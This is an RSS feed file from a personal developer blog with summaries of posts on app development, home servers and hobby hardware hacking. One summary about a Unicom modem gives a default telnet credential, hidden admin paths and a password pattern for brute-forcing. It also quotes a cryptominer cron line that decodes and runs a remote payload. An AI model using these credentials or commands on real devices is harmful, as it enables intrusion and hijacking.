@@ -1,0 +1,148 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>RanKKI's Blog</title><link>https://rankki.xyz/</link><description>Recent content on RanKKI's Blog</description><generator>Hugo</generator><language>zh-cn</language><copyright>Hugh(Hui) Liu</copyright><lastBuildDate>Sat, 29 Jun 2024 13:16:57 +1000</lastBuildDate><atom:link href="https://rankki.xyz/index.xml" rel="self" type="application/rss+xml"/><item><title>Use Firebase remote config with Expo</title><link>https://rankki.xyz/posts/use-firebase-remote-config-with-expo/</link><pubDate>Thu, 20 Jun 2024 13:15:18 +1100</pubDate><guid>https://rankki.xyz/posts/use-firebase-remote-config-with-expo/</guid><description>Firebase JS SDK does not support Remote Config by default1. The only way to use it is to eject from Expo and use a bare project with React Native Firebase.
+Refactoring the current project to use a different approach is challenging, so we prefer to stay with Expo.
+To use Firebase Remote Config, we can follow the instructions, but this leads to the first problem:
+firebaseerror: remote config: indexed db is not supported by current browser (remoteconfig/indexed-db-unavailable).</description></item><item><title>React Native SVG File to Component</title><link>https://rankki.xyz/posts/react-native-svg-file-to-component/</link><pubDate>Sun, 17 Sep 2023 16:32:38 +1000</pubDate><guid>https://rankki.xyz/posts/react-native-svg-file-to-component/</guid><description>When creating a React Native app, you may want to use SVG files as icons. This is a quick guide on how to convert an SVG file to a React Native component.
+Use SVG as component It&amp;rsquo;s easy to create SVG elements in your RN project by using react-native-svg.
+yarn add react-native-svg 1 2 3 4 5 6 7 8 9 10 11 import * as React from &amp;#39;react&amp;#39;; import Svg, { Circle, Rect } from &amp;#39;react-native-svg&amp;#39;; export default function SvgComponent(props) { return ( &amp;lt;Svg height=&amp;#34;50%&amp;#34; width=&amp;#34;50%&amp;#34; viewBox=&amp;#34;0 0 100 100&amp;#34; {.</description></item><item><title>Build in Public #1</title><link>https://rankki.xyz/posts/build-in-public-1/</link><pubDate>Sun, 23 Jul 2023 22:16:35 +1000</pubDate><guid>https://rankki.xyz/posts/build-in-public-1/</guid><description>距离第一个独立开发产品已经上线 1 年多了，也时不时的在更新内容和增加新的功能。
+IAP 除了一开始加的赞助（并没有很多付费）；现在也加了 AI Chat 的功能，使用是 OPENAI 的 GPT 模型 + Vector 数据库实现的更精准的对话。在此基础上，也使用 Firestore 作为数据库存了一些数据。
+基础数据 下载 大部分用户（68.5%）是通过 App Store 搜索下载的，12% 的用户是通过浏览下载，巅峰是在 2022 年 4 月，应该是上了每周编辑推荐。剩余的 18.8% 是通过网站或者 App 的 Referrer 下载。
+卸载 不出意外，合乎情理的，卸载占比最多的用户群里，是在 App Store 浏览时下载的用户。其中 16.97% 的选择了卸载，而通过搜索来的用户，其目的性更强，并且知道该 App 的作用、功能，因此，安装/卸载比相对于浏览来的用户低 41.42%。
+活跃用户 这里的数据有一点看不懂了，通过浏览下载的用户的活跃比，相对于搜索的用户高 13%。
+App Referrer 下载来源最多的 App 竟然是 WeChat&amp;hellip;
+曝光 &amp;amp; 转化 除去上了每周推荐的那一周，平均每月搜索曝光 10k 左右，普通浏览在 500 - 1000 之间。
+但转化率很低，搜索带来的转化在 12%，浏览 3.32%，综合平均 8.98%
+最近会尝试通过换 App icon + AB Test 来尝试提高转化率。</description></item><item><title>React Native 全局 JS 代码</title><link>https://rankki.xyz/posts/global-js-in-react-native-or-expo/</link><pubDate>Mon, 26 Jun 2023 20:50:40 +1000</pubDate><guid>https://rankki.xyz/posts/global-js-in-react-native-or-expo/</guid><description>最近在写 RN 项目，使用了新的技术栈 Expo。
+Expo 是一个基于 React Native 的开发工具，可以让你更快的开发 React Native 应用，不需要配置 Android 和 iOS 的开发环境，只需要安装 Expo 的客户端就可以运行你的应用。
+在开发的过程中，遇到了一个很诡异的 Bug。在 Dev 环境（即使用 Expo Go 进行预览）下，项目运行正常，但是在打包成 ipa 之后，运行在真机上，就会出现 Crash，
+一开始通过看 TestFlight 日志，没发定位问题，报错栈只会到某一个 Invoke 方法下，再具体的内容就没有了。
+本以为是某种只在真机上才会出现的 Bug，但在使用 expo start --no-dev 进行本地预览时，也会出现 Crash。
+同样，没有报错栈，不知道为何发生。
+日志 通过使用 usb 线连电脑，使用 console.app 可以查到 iOS 设备上的日子。
+通过搜索+限定 process name 即可看到所有该 App 产生的日志。
+2021-06-26 20:50:40.000000+1000 &amp;lt;AppName&amp;gt;[&amp;lt;AppName&amp;gt;][fatal][tid:com.facebook.react.ExceptionsManagerQueue] Unhandled JS Exception: TypeError: undefined is not an object XXXXXXX_Provider YYYYYYY ZZZZZZZZ 定位问题 根据日志，能得出是某个 Provider 出现了问题，但不知道具体哪一行或者哪个方法，</description></item><item><title>3DS 游戏安装</title><link>https://rankki.xyz/posts/3ds-game-installation/</link><pubDate>Thu, 23 Mar 2023 18:26:10 +1100</pubDate><guid>https://rankki.xyz/posts/3ds-game-installation/</guid><description>收了台 New 3DS LL，成色十分新，价格也很便宜。到手第一件事就是「破解」，跟着文档1，大概半小时就完成了。
+在安装游戏的时候，发现内置的 FBI 安装速度在 2MB/s，小游戏还行。对于动辄就 2、3GB 的游戏，光安装就要 20+ 分钟。
+经过一番查找2，发现可以在电脑上直接安装到 SD卡 上。
+使用这种方法安装真的很快，基本上跑满了 SD 卡的速度，80+MB/s
+直接安装至 SD 卡 跟着教程3可以 dump 出 boot9.bin 和 movable.sed，然后直接调用 Python 脚本即可完成安装
+1 python3 custominstall.py -b boot9.bin -m movable.sed --sd /path/to/sd file.cia file2.cia CCI 文件 但问题来了，3DS 支持多种文件格式，但 custominstall.py 只能安装 cia 文件，因此可以用 3dsconv4 将 cci 转成 cia，然后再使用 custominstall.py 安装到 SD 卡。
+3ds.hacks&amp;#160;&amp;#x21a9;&amp;#xfe0e;
+custom-install&amp;#160;&amp;#x21a9;&amp;#xfe0e;
+Dump 文件&amp;#160;&amp;#x21a9;&amp;#xfe0e;
+3dsconv&amp;#160;&amp;#x21a9;&amp;#xfe0e;</description></item><item><title>使用 Certbot 对内网域名签名</title><link>https://rankki.xyz/posts/certbot-sign-internal-domain/</link><pubDate>Sun, 05 Mar 2023 22:48:16 +1100</pubDate><guid>https://rankki.xyz/posts/certbot-sign-internal-domain/</guid><description>前情提要 有一个 All-In-boomOne 的服务器，然后为了方便管理，不用记 IP 地址。搭建了一台内网 DNS 服务，并使用自己的某三级域名 internal.example.org 作为内网域名使用。
+虽然说内网服务，上不上 HTTPS 没差，但在 iOS Safari 上会有不安全的提醒，以及没有那把小锁🔒，看着不舒服。
+Certbot 在签名的时候，会查 DNS 记录，但内网域名只在内网使用，怎么可能会有公网的 DNS 记录呢。
+以及，我的 nginx 是放在 Docker 里跑的，相对于直接在宿主机上还是有点区别的
+解决方案 在某 medium 文章中1，使用了 Certbot 的 Docker 镜像，并且将该容器的一些目录和 nginx 容器目录做了共享。
+1 2 3 4 5 6 7 8 9 10 11 12 13 services: web: container_name: nginx image: docker.io/nginx volumes: - ${PWD}/conf.d:/etc/nginx/conf.d - ${PWD}/certbot/conf:/etc/letsencrypt - ${PWD}/certbot/www:/var/www/certbot certbot: image: docker.io/certbot/certbot volumes: - ${PWD}/certbot/conf:/etc/letsencrypt - ${PWD}/certbot/www:/var/www/certbot 配置 Nginx 然后在 nginx 的 *.</description></item><item><title>在旧芯片组使用 NVMe SSD 安装 Ubuntu</title><link>https://rankki.xyz/posts/install-ubuntu-with-nvme-on-old-chipset-motherboard/</link><pubDate>Sat, 04 Mar 2023 10:19:00 +1100</pubDate><guid>https://rankki.xyz/posts/install-ubuntu-with-nvme-on-old-chipset-motherboard/</guid><description>前情提要 手上有一个 H61 芯片组的主板的 NAS， 4 个 SATA 口和硬盘位。毕竟主板那么旧了，也没有 M.2 接口。最一开始是把 OS 安装到了 U 盘上，后来搬家，U 盘丢了，就说顺手升级一下系统盘。
+于是乎，买了 PCI-E 转 M.2 接口的 adapter 和一块 NVMe M.2 的 WD SN570.
+普通安装 直接做了个 Ubuntu Server 的安装盘，并直接在 NAS 上进行安装，发现找不到盘。于是，将 NVMe SSD 拆到 PC 上进行安装，同时将引导安装到 SSD 上。
+当还是启动不来，一番搜索得出1
+可能是主板太老，BIOS 没有对 NVMe 盘的支持。但可以通过 Clovers 这种引导启动
+安装 Clovers 使用这种方法的坏处就是，你需要一个 U 盘做启动盘，但系统还在 SSD 上， 相比于 U 盘做系统盘，速度好了很多。
+但刷完引导发现引导里并没有 Ubuntu Server。
+盘没有读取成功 进入到安装盘带的 Shell 里，运行 fdisk --list 和 lshw 发现根本找不到 NVMe 的设备。</description></item><item><title>Zero-downtime upgrade by using Docker Swarm</title><link>https://rankki.xyz/posts/zero-downtime-upgrade-by-using-docker-swarm/</link><pubDate>Sat, 11 Feb 2023 13:52:28 +0800</pubDate><guid>https://rankki.xyz/posts/zero-downtime-upgrade-by-using-docker-swarm/</guid><description>We want users to be able to continue using the service during the upgrade process, the first thing we have to do is kill the process when we want to upgrade a running application, and then restart it.
+Here is the problem, there is a gap between killing and restarting a process, is there a way to solve this?
+And what if the new changes have bugs? How do we restart the old application in a quick way?</description></item><item><title>联通 DT741-csf 光猫管理员账号</title><link>https://rankki.xyz/posts/modem-super-user/</link><pubDate>Fri, 15 Jul 2022 18:07:46 +0800</pubDate><guid>https://rankki.xyz/posts/modem-super-user/</guid><description>最近在整自动追番1，需要用到 BT 下载，Aria2 似乎没有 UPnP ，所以需要手动设置下虚拟主机，端口转发之类的事情。看了下家里的光猫是联通的 DT741-csf。
+在各种搜索和自己研究中，找到了一些破解的方法。
+/hidden_version_switch.html 打开 telnet ，使用 root:Pon521 登陆之后拿配置文件 /getpage.gch?pid=1002&amp;amp;nextpage=*.gch 可以跳转到一些普通用户看不到的界面 使用默认用户名密码 CUAdmin 上面三种方法都不行，telnet 端口虽然打开了，但密码不对。通过 /getpage.gch 最多跳转到 FTP 设置界面，更多设置估计是在后台有做限制了。
+我甚至安装了 Kail Linux 准备穷举 telnet 密码，但由于是单线程，太慢了，就放弃了。
+后来就是投诉到当地联通宽带，回电说一般情况是不能给用户管理员密码之类的，还要求我做个保证，如果自己玩坏了，不能找联通修。
+题外话：装机师傅和联通客服都不知道什么是管理员密码，他们甚至分不清宽带账户、猫的登录、管理员账户和路由器账户。还被师傅教育不要乱搞，别以为自己很聪明 etc&amp;hellip;
+最后拿到了密码 CUAdmin&amp;lt;随机数字x8&amp;gt; （同 telnet 密码），用户名是 CUAdmin，登陆位置 ip/cu.html，
+倒是能给以后的穷举提供思路。我在穷举 telnet 密码时用的是 CUAdmin,cuadmin,admin 作为前缀加数字 0 一直到 10000000。但现在已知组合情况，可以少很多次尝试，虽然还是有 10^8 可能性&amp;hellip;.. 但至少是在范围内了。
+虽然体验不是很好，但是联通给公网 IP 还是很大方的，1 分钟的电话就要到了。
+不小心把 Redis 也暴露在公网上了（没有密码），瞬间被塞挖矿/加密之类的脚本的内容到 Redis 里..
+*/3 * * * * * &amp;lt;url-b64&amp;gt;|base64 -d|bash|bash Jellyfin 自动追番&amp;#160;&amp;#x21a9;&amp;#xfe0e;</description></item><item><title>Jellyfin 自动追番</title><link>https://rankki.xyz/posts/auto-bangumi/</link><pubDate>Wed, 13 Jul 2022 16:34:17 +0800</pubDate><guid>https://rankki.xyz/posts/auto-bangumi/</guid><description>该系统主要依赖蜜柑计划的 RSS 订阅
+在 GitHub 上看到个自动追番的项目 EstrellaXD/Auto_Bangumi，贡献了一点点代码，加了 CI/CD。但自己跑了下，发现在树莓派上跑不起来，可能是 32 位 ARM 架构导致的，加上这个项目和 qBittrroent 深度绑定，扩展起来就十分麻烦。比如说，支持 Aria2 或者 Transmission，甚至是对 RSS、其他网站的处理，基本上是不行的。
+于是，自己开了个新项目 RanKKI/Bangumi，其中对文本处理的代码均来自 EstrellaXD/Auto_Bangumi。
+一旦花点时间配置好，后续追番都是无成本的。
+一些 Features 内置蜜柑计划和动漫花园的 RSS 解析器 支持自定义 RSS 插件（用于解析其他 RSS 站点或者非 RSS 网页） 番剧更新提醒（通过 API，比如 iOS 上的 Bark，或者本地脚本触发） 自动筛选清晰度较高的资源 自动过滤已下载过的资源 支持 Aria2, Transmission, qBittorrent 通过 API 下载完结番剧 一些坑 在配置这套系统的时候，遇到了难题。最最最主要的是 Jellyfin 刮削不动，一直没有信息产生，于是在本机跑了个代理解决了刮削问题。
+后续的计划 语言优先级的筛选 自动替换本地视频至较高清的资源（比如目前只有 720P 的放出，在遇到 1080P 的时候还会下载并替换） 完善 API 与bgm.tv配合，实现更多自动化操作 Jellyfin 自动化 当资源从下载目录移动至储存盘后，Jellyfin 会自动检测更新并挂削数据。不需要更多的手动处理。
+我使用 bgm.tv 管理观看内容、进度并发现了一个插件可以在看完某集动漫后自动更新网站上的进度.
+蜜柑计划 蜜柑计划是一个动漫资源网站，其特点是可以订阅不同番剧、不同字幕组，从而生成一份 RSS 文件</description></item><item><title>河南村镇银行储户被赋红码问题</title><link>https://rankki.xyz/thoughts/henan-health-red-code/</link><pubDate>Wed, 22 Jun 2022 19:55:11 +0800</pubDate><guid>https://rankki.xyz/thoughts/henan-health-red-code/</guid><description>【关于部分村镇银行储户被赋红码问题调查问责情况的通报】经查，郑州市委政法委常务副书记、市新冠肺炎疫情防控指挥部社会管控指导部部长冯献彬，团市委书记、市新冠肺炎疫情防控指挥部社会管控指导部副部长张琳琳，擅自决定对部分村镇银行储户来郑赋红码，安排市委政法委维稳指导处处长赵勇，市大数据局科员、市疫情防控指挥部社会管控指导部健康码管理组组长陈冲，郑州大数据发展有限公司副总经理杨耀环，对储户在郑扫码人员赋红码。据统计，共有1317名村镇银行储户被赋红码，其中446人系入郑扫场所码被赋红码，871人系未在郑但通过扫他人发送的郑州场所码被赋红码。
+冯献彬、张琳琳、陈冲、杨耀环、赵勇等同志法治意识、规矩意识淡薄，违反《河南省新冠肺炎疫情防控健康码管理办法》及健康码赋码转码规则，擅自对不符合赋码条件的人员赋红码，严重损害健康码管理使用规定的严肃性，造成严重不良社会影响，是典型的乱作为，冯献彬、张琳琳同志对此分别负主要领导责任、重要领导责任，陈冲、杨耀环、赵勇同志对此负直接责任，应予从严从重问责追责。
+依据《中国共产党纪律处分条例》《中华人民共和国公职人员政务处分法》，经研究决定，给予冯献彬同志撤销党内职务、政务撤职处分；给予张琳琳同志党内严重警告、政务降级处分；给予陈冲同志政务记大过处分；给予杨耀环、赵勇同志政务记过处分。（清风郑州） 1
+【404文库】量子学派｜这不是一个红码，这是一座监狱
+【404文库】星球商业评论｜犯我者虽远必“朱”：多名维权储户被红码
+https://web.archive.org/web/20220622115100/https://m.weibo.cn/status/4783221324385585&amp;#160;&amp;#x21a9;&amp;#xfe0e;</description></item><item><title>Film Dev Privacy Policy</title><link>https://rankki.xyz/pages/film-dev-privacy-policy/</link><pubDate>Mon, 30 May 2022 13:30:25 +0800</pubDate><guid>https://rankki.xyz/pages/film-dev-privacy-policy/</guid><description>In this app B&amp;amp;W Film Dev, we do not collect any information from you, all of your information are stored in the iCloud and sync with all devices that your have been login with same Apple ID, and we do not have permission to access it.
+If you have any question or problem with this app, fell free to contact me via any method from about page</description></item><item><title>在 iPod A5 设备上使用 Checkm8 漏洞</title><link>https://rankki.xyz/posts/checkm8-on-a5-ipod/</link><pubDate>Wed, 11 May 2022 10:16:07 +0800</pubDate><guid>https://rankki.xyz/posts/checkm8-on-a5-ipod/</guid><description>漏洞的详细分析可以看 Checkm8 漏洞研究 和 iPhone史诗级漏洞checkm8攻击原理浅析，感觉讲的很可以，但因为我不是搞二进制的，不是很能看懂。
+前言 手上有一台 A5，有 iCloud 锁的 iPod，一直没用。2019 年的时候知道了 ipwndfu 和 check1rn 两个项目，本以为能解决这台 iPod，但 CPU 处理器 S5L8942 并没有支持，于是就搁置了。
+后来得知了一个新项目checkm8-a5, 用于处理 A5 的设备，但需要准备 Arduino 和 USB Host shield，根据 Issue#15 的介绍。这个芯片很特别，但电脑系统的行为会和预期的不一样，所以导致漏洞的利用会失败。
+it is only for arduino because the A5 chipset is very specific, so an OS like macOS or Windows (or even Linux) will mess things up because we need exact control over the USB Port. 来源
+设备 在网购了 Arduino 和 USB Host shield 之后，等待数日之后便开始尝试了。</description></item><item><title>关于我做了一个中国法律手册的 iOS 应用</title><link>https://rankki.xyz/posts/ios-app-chinese-law/</link><pubDate>Sun, 06 Mar 2022 21:30:40 +0800</pubDate><guid>https://rankki.xyz/posts/ios-app-chinese-law/</guid><description>序 法治社会，我们需要知法懂法，知道我们应该做什么，不应该做什么，什么是符合我们的权益的，什么是我们应该享有，但没有得。
+我目前经历过，商场价格错误，吃饭吃出异物，淘宝买东西不按规定时间发货等事情。我都有按照法律规定去维护属于我的权益，从找经理到北京互联网法院起诉。
+我并不是为了那点钱而选择维权的，说实话， 赔偿赔个几百，一千，都不够我时间成本的。
+但我一直相信，如果我们每个人都愿意花费点精力去维护我们自己的权益，社会只会变得更好。
+没有商家敢违背自己承诺的发货时间，饭店也会更注意食品安全，没有价格欺诈，虚假宣传。
+我一个人肯定是不够的， 需要社会中每个人的努力，才能做到这些。
+我为什么要做这样的一款 app ? 每次在维权之前，我都需要打开网页，搜索，找到第 n 条，这个太慢了，所以需要一个本地的软件，无网络请求，无广告的一个 app 去解决我的痛点。
+诚然， App Store 上有各种 app 也做了一样的功能，但这些 app 要么就是塞一堆东西， 要么就是广告，付费。我用过的一款， 打开 app 的时候先给我来一个大开屏广告， 等个 5秒，10秒才能管。 很掉价.. 就，我很需要某些内容，但你给我播个广告&amp;hellip;
+关于本 app 完全开源在 GitHub 使用 SwiftUI 驱动 法条内容使用 Markdown 储存 （感觉没啥意义hhh) 无网络连接 无数据追踪 尾 现已在 App Store 上架
+更新 2020-03-18 上 AppStore 每周编辑推荐了！心情真的很棒，言语无法表达的棒</description></item><item><title>Deploy MongoDB replica set and sharding</title><link>https://rankki.xyz/posts/mongodb-replica-set-and-sharding/</link><pubDate>Fri, 03 Dec 2021 11:33:25 +0800</pubDate><guid>https://rankki.xyz/posts/mongodb-replica-set-and-sharding/</guid><description>Scale-up or Scale-out Why scale? Imagine you have a computer (server) that can serve 5 users at the same time, When Alice becomes the 6th user, Alice has to wait for someone to free up the server resources.
+It&amp;rsquo;s not user friendly, so you need to improve the performance of the server.
+Scale-up You decide to upgrade the hardware, using Intel i9 instead of i3, upgrading RAM from 4GB to 64GB and using 1Gbps fibre broadband instead of your ADSL broadband.</description></item><item><title>Cocos Creator 3.3 版本写 2D 游戏，点击事件无反应</title><link>https://rankki.xyz/posts/cocos-creator-click-event-does-not-working/</link><pubDate>Mon, 20 Sep 2021 11:30:38 +0800</pubDate><guid>https://rankki.xyz/posts/cocos-creator-click-event-does-not-working/</guid><description>周末闲来无事，学习下 Cocos Creator 3.3 (以下简称 CC)，之前接触的版本是 2.X。3.X 最大的改变是合并了 CC 3D 这个项目，官方的介绍是
+Cocos Creator 3.0 集成了原有 2D 和 3D 两套产品的所有功能，带来了诸多重大更新，将做为 Creator 之后的主力版本。同时 v3.0 还延续了 Cocos 在 2D 品类上轻量高效的优势，并且为 3D 重度游戏提供高效的开发体验。 来源
+相较于 2D 游戏的 x &amp;amp; y 轴， 3D 游戏多了 z 轴的概念，毕竟是 3D 空间
+现象 在写游戏中，经常需要给某个节点增加一个缓动的动画，基本上是这么写
+1 2 3 4 tween(this.node) .to(5 / 24, { scale: new math.Vec3(1.1, 1.1) }) .to(5 / 24, { scale: new math.Vec3(1.0, 1.0) }) .start() 这就是一个很普通的放大再缩小的动画，但在这个动画被出发之后，我发现这个节点的点击事件不好使了。 本来以为是哪个把这个节点上 Button 组件设置为禁止点击了。但通过删除相关代码，延迟打印interactable，结果都是证明了，这个组件没有问题。</description></item><item><title>Tree Shaking Cocos Creator 项目</title><link>https://rankki.xyz/posts/tree-shaking-cocos-creator-project/</link><pubDate>Thu, 16 Sep 2021 10:32:58 +0800</pubDate><guid>https://rankki.xyz/posts/tree-shaking-cocos-creator-project/</guid><description>&lt;p>Cocos Creator 打包出的项目，会对每个文件生成 &lt;code>helper function&lt;/code>，但实际上，我们只有一个 &lt;code>index.js&lt;/code>，在打包的时候却把所有的 &lt;code>helper function&lt;/code> 打到了一起，因此导致一个 &lt;code>index.js&lt;/code> 文件内，拥有很多个 &lt;code>helper function&lt;/code>&lt;/p>
+&lt;p>因此可以通过 Tree Shaking 的方法能裁切掉很多无用的函数定义，从而降低文件大小。&lt;/p></description></item><item><title>修复 Cocos Creator 加载资源过慢</title><link>https://rankki.xyz/posts/cocos-creator-slow-resources-load/</link><pubDate>Fri, 10 Sep 2021 11:56:35 +0800</pubDate><guid>https://rankki.xyz/posts/cocos-creator-slow-resources-load/</guid><description>&lt;p>在写 Cocos Creator 2.4.6 项目时候 (以下简称 CC)，需要增加一些反馈的音效。比如说按钮点击时，播放动画时。但在处理播放声音的时候，遇到个奇怪的问题。在有些设备上，声音一直会有延迟，感觉上来说，少则 100ms 多则 500ms，这点的体验就十分的差了，也是完全不能接受的。&lt;/p></description></item><item><title>自动发布白鹭引擎小游戏到微信平台 CI/CD</title><link>https://rankki.xyz/posts/egret-based-game-auto-upload-to-wechat-by-github-action-ci/</link><pubDate>Wed, 14 Jul 2021 18:30:36 +0800</pubDate><guid>https://rankki.xyz/posts/egret-based-game-auto-upload-to-wechat-by-github-action-ci/</guid><description>&lt;p>最近一段时间在使用白鹭 Egret Engine，为了统一和方便，选择使用 GitHub Action 做 CI/CD，但在折腾的过程中，发现了很多坑。&lt;/p></description></item><item><title>对 COVID-19 的一些记录</title><link>https://rankki.xyz/posts/records-of-covid-19/</link><pubDate>Sun, 13 Jun 2021 21:57:46 +0800</pubDate><guid>https://rankki.xyz/posts/records-of-covid-19/</guid><description>1 月 3 号， 李文亮医生等人被武汉市公安局-武昌分局开具训诫书
+1 月 10 日，李文亮医生出现症状。 1 月 31 日，确诊。 2 月 07 日，逝世。 专家研判认为，当前疫情仍可防可控。但新型冠状病毒传染来源尚未找到，疫情传播途径尚未完全掌握，病毒变异仍需严密监控。来源
+2021 年 11 月 那么多国家都放弃了，为什么中国还要坚持疫情“清零”？ 2022 年 03 月 上海为什么不封城？ 感染者数据还在上升，上海为什么不能“封城”？官方回应 上海全域での外出制限始まる 貨物便の欠航など物流に影響も 今晨5时起，上海浦东封控！开展核酸筛查 上海分两批封城 浦东市民连夜抢物资 2022 年 04 月 “动态清零”是我国当前抗击疫情的最佳选择（人民论坛） 人民网评：新冠疫苗应接尽接是老年人的理性选择 人民热评：疫情防控不松劲，春耕备耕不误时 人民日报：清零”是综合社会成本最低的抗疫策略 2022 年 10 月 人民日报：“动态清零”可持续而且必须坚持 上海：即日起来沪返沪人员需“三天三检”，未完成将被赋黄码 中国释放二十大后继续坚持“清零”防疫信号 2022 年 11 月 兰州煤气中毒身亡男童：疫情三年 便是他的一生 坚决打赢常态化疫情防控攻坚战——近期抗击新冠疫情扫描 最新！全国多地宣布：外来人员抵达5天内不得进入餐饮超市等公共场所 上海高风险区+20！官方解读最新来沪返沪“不满5天”！北京：新国展轻症方舱医院投用 2022 年 12 月 抵京后不再执行落地“三天三检” 新冠病毒阳性感染者如何进行居家康复？北京发布指引 张伯礼支招：如何做好自己健康第一责任人 新冠疫情防控措施再优化，“不安全感”没必要 国务院联防联控机制发布新冠病毒感染者居家治疗指南 国家卫健委：关于印发新冠病毒感染者居家治疗指南的通知 中国当局压制大规模抗议，但抵抗余波犹存 他们曾新冠阳性：有人嗅觉短暂消失，有人一直咳嗽，有人很快康复｜钛媒体影像《在线》 重大转变！广州官方正式确认：新冠毒力还不如流感严重！ 上海市进一步优化调整疫情防控措施：抵沪不满5天者不再限制其进入相关公共场所 2023 年 03 月 创造人类文明史上人口大国成功走出疫情大流行的奇迹（人民要论）[网易]</description></item><item><title>白鹭引擎的反向遮罩</title><link>https://rankki.xyz/posts/invert-mask-on-egret-engine/</link><pubDate>Wed, 07 Apr 2021 20:30:46 +0800</pubDate><guid>https://rankki.xyz/posts/invert-mask-on-egret-engine/</guid><description/></item><item><title>白鹭 Egret 微信项目在高帧率设备上 Timer 不准确的解决</title><link>https://rankki.xyz/posts/egret-timer-not-working-on-high-fps-devices/</link><pubDate>Sat, 05 Dec 2020 21:14:46 +0800</pubDate><guid>https://rankki.xyz/posts/egret-timer-not-working-on-high-fps-devices/</guid><description>&lt;p>目前实习在的项目组的产品，经常有玩家反馈某个地方倒计时会变快，内部也有小伙伴发现了这个问题，在 iPad Pro 上更是达到了 2 倍速， 但因为受影响的用户很少很少，一直没修。上周，因为日程上不是很忙，便找了一天去修复这个 bug。&lt;/p></description></item><item><title>iTunes 中日英歌曲排序问题</title><link>https://rankki.xyz/posts/itunes-sorting-problem/</link><pubDate>Sun, 18 Oct 2020 14:20:02 +0000</pubDate><guid>https://rankki.xyz/posts/itunes-sorting-problem/</guid><description>因为个人原因， 我基本是下载歌曲并整理导入 iTunes，然后同步到各个设备上。 同时，我的设备语言是了英文，这就导致，所有英文歌曲按照 A-Z 排序，然后所有日文和中文歌曲在 # 的位置里。
+搜索了下相关问题，知道 iTunes 有一个标签， sorting name， 即 iTunes 可以按照这个变量进行排序，比如将中文转换成拼音，或者日文转成罗马音。 这样就可以正常排序了。
+解决方法是有了，但曲库都是以几百首、几千上万计算的， 不可能一个一个的去改。 作为程序员，要遵守
+宁愿写 1，2 个小时的脚本，也不愿意花半小时手动完成任务
+当然，写脚本是为了以后，新增歌曲的时候，可以自动化的完成编辑，可以省很多时间。
+macOS (从 10.5 开始）提供了接口，叫做 ScriptingBridge，位于
+/System/Library/Frameworks/Python.framework/Versions/Current/Extras/lib/python/PyObjC/
+可以通过这个 bridge 获取 iTunes 的文件并对信息进行更改， 随后可以使用其他库或者脚本，转成拼音（或者罗马音）</description></item><item><title>澳大利亚维州租房相关事项</title><link>https://rankki.xyz/posts/rent-in-victoria-australia/</link><pubDate>Tue, 07 Jul 2020 17:13:10 +0000</pubDate><guid>https://rankki.xyz/posts/rent-in-victoria-australia/</guid><description>&lt;h2 id="tldr">TL;DR&lt;/h2>
+&lt;ul>
+&lt;li>基本所有二房东都不合法&lt;/li>
+&lt;li>押金要交给 RTBA&lt;/li>
+&lt;li>房东除非有合理的原因，不然不能拒接分租 (即 当二房东)&lt;/li>
+&lt;li>签 Co-tenancy 的合租需要为所有人负责，即如果有人没交房租，那你需要补上。&lt;/li>
+&lt;li>房东没权利向租客索取因晚付房租产生的任何费用&lt;/li>
+&lt;li>入住前一定要好好填写 condition report&lt;/li>
+&lt;/ul></description></item><item><title>Golang Gin 框架 Middleware</title><link>https://rankki.xyz/posts/golang-gin-middleware/</link><pubDate>Tue, 30 Jun 2020 09:51:35 +0000</pubDate><guid>https://rankki.xyz/posts/golang-gin-middleware/</guid><description/></item><item><title>对于 Bilibili 抽奖的数据分析</title><link>https://rankki.xyz/posts/data-analyse-on-bilibili-lottery/</link><pubDate>Sat, 06 Jun 2020 12:07:37 +0000</pubDate><guid>https://rankki.xyz/posts/data-analyse-on-bilibili-lottery/</guid><description>&lt;p>最近开始深入数据分析的坑，虽然在学了 FIT1043，但这门课是第一年的课，加上比较水 (但又是必修课)，
+就没有学到东西，最近闲来无事，正好在哔哩哔哩参加了&lt;code>@毕导 THU&lt;/code>的抽奖， 并且有 33 个名额，所以想着来做一次分析。&lt;/p></description></item><item><title>Javascript 逆向找到 genToken() 源码</title><link>https://rankki.xyz/posts/javascript-token-function-reveal/</link><pubDate>Wed, 08 Apr 2020 19:36:32 +0000</pubDate><guid>https://rankki.xyz/posts/javascript-token-function-reveal/</guid><description>&lt;p>最近开始了我的实习之旅，爬虫相关的， 然后就遇到某个网站在获取部分 URL 的时候，header 里会带有一个 token，根据内容能发现是 HMAC 加密的&lt;/p>
+&lt;p>没有 token 的时候一律会返回错误， 于是研究了下 JS 的逆行，找到了生成 token 的 function&lt;/p></description></item><item><title>胶片 2019</title><link>https://rankki.xyz/posts/film-2019/</link><pubDate>Fri, 10 Jan 2020 12:12:29 +0000</pubDate><guid>https://rankki.xyz/posts/film-2019/</guid><description>2019 年 年中看了一些人的视频，种草胶片摄影了，于是 11 月就在 ebay 上搞了台 Fujica stx-1n，一款入门级的 SLR. A$78, (后来在 Film Never Die 也看到这款机器了，要 A$400 多，看起来成色差不多)
+目前用过 Kodak C200, Gold, Pro image，还有一卷 Protar 160 (但还没洗出来), Dev + Scan 都是在楼下的 Film Never Die 进行的，A$13 刀。
+Update: 2020 年买了一套冲洗设备，自己手冲黑白胶卷。</description></item><item><title>Samba - 对没有权限的用户隐藏文件 (夹)</title><link>https://rankki.xyz/posts/hide-share-folder-for-unauthorised-users/</link><pubDate>Sun, 05 May 2019 12:25:27 +0000</pubDate><guid>https://rankki.xyz/posts/hide-share-folder-for-unauthorised-users/</guid><description>最近在搞 OpenMediaVault，然后在设置每个用户的访问权限，
+但是发现就算用户没有某个文件夹的访问权限， 用户通过 Finder(macOS) 访问的时候，还是会显示这个文件夹，然后过一会，Finder 会提示找不到这个文件夹。
+这样就很破坏用户体验，
+于是在 DuckDuckGo 了一会，找到了 Hiding samba share from browse list for unauthorised users 这个 post
+只要在smb.conf里的[Global]添加一行 access based share enum = yes 就可以了
+在 OMV 里面的话，在 SMB/CIFS 设置的， 有一个 Extra options，在这里把access based share enum = yes加进去，然后 save， apply changes，
+就可以实现对没有权限的用户隐藏掉文件夹，</description></item><item><title>修复在 Python 交互界面中无法使用方向键和 tab 键</title><link>https://rankki.xyz/posts/fix-escape-characters-in-python-shell/</link><pubDate>Sat, 23 Mar 2019 14:32:12 +0000</pubDate><guid>https://rankki.xyz/posts/fix-escape-characters-in-python-shell/</guid><description>背景 在日常使用 Python 中（使用交互界面）时，经常遇到按方向键，会出现^[[D, ^[[A 等符号，以及不能使用 tab 自动补全，
